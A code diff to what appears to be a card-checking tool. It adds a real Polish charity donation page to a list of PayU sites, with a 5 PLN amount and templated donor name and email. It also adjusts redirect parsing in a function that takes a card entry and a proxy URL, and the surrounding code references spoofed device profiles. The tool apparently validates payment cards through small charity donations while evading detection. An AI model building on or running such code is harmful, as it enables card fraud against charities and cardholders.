@@ -425,6 +425,30 @@ PAYU_SITES = {
             "recurring": "false",
         },
     },
+    "poranek": {
+        "create_type": "ajax",
+        "create_url": "https://poranek.pl/wp-admin/admin-ajax.php?action=blupayments_pay",
+        "redirect_field": "data.redirect",
+        "referer": "https://poranek.pl/chce-pomoc/datek/",
+        "origin": "https://poranek.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "donation_form": {
+            "firstname": "{first}",
+            "lastname": "{last}",
+            "email": "{email}",
+            "phone": "",
+            "description": "",
+            "amount": "5",
+            "terms": "1",
+            "terms2": "1",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -727,7 +751,12 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                          "Content-Type": "application/x-www-form-urlencoded",
                          "X-Requested-With": "XMLHttpRequest"})
             data = r.json()
-            redirect = data.get(cfg.get("redirect_field", "href")) or ""
+            redirect = data
+            for part in cfg.get("redirect_field", "href").split("."):
+                redirect = redirect.get(part) if isinstance(redirect, dict) else None
+                if redirect is None:
+                    break
+            redirect = redirect or ""
         elif cfg["create_type"] == "utf":
             # two-step: donation form -> HTML with NewPayment form -> NewPayment -> redirect
             form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
